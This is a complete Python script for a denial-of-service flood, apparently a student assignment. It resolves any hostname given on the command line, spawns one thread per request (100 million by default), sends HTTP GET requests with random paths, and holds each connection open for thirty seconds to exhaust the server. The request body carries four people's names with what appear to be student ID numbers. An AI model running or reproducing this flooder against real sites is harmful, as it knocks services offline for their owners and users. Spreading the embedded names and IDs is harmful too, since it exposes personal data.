import random
import socket
import string
import sys
import threading
import time

host = ""
ip = ""
port = 0
num_requests = 0

if len(sys.argv) == 2:
    port = 80
    num_requests = 100000000
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_requests = 100000000
elif len(sys.argv) == 4:
    port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
else:
    print(f"ERROR\nUsage: {sys.argv[0]} <Hostname> <Port> <Number_of_Attacks>")
    sys.exit(1)

try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print("ERROR\nMake sure you entered a correct website")
    sys.exit(2)

thread_num = 10000
thread_num_mutex = threading.Lock()

def print_status():
    global thread_num
    thread_num_mutex.acquire(True)
    thread_num += 1
    sys.stdout.write(f"\r{time.ctime().split()[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
    sys.stdout.flush()
    thread_num_mutex.release()

def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data

def attack():
    print_status()
    url_path = generate_url_path()

    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        dos.connect((ip, port))

        payload = "Bram Aristyo (24/550166/NPA/19971), Ihsanul Arifin (24/549754/NPA/19957), Hanif Cahyo (24/550107/NPA/19964), Zufar Athoya (22/494574/PA/21279)"
        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\n{payload}").encode()
        dos.send(byt)

        time.sleep(30)
    except socket.error:
        print(f"\n[ No connection, server may be down ]: {str(socket.error)}")
    finally:
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()

print(f"[#] Attack started on {host} ({ip}) || Port: {str(port)} || # Requests: {str(num_requests)}")

all_threads = []
for i in range(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    time.sleep(0.00001)   

for current_thread in all_threads:
    current_thread.join()
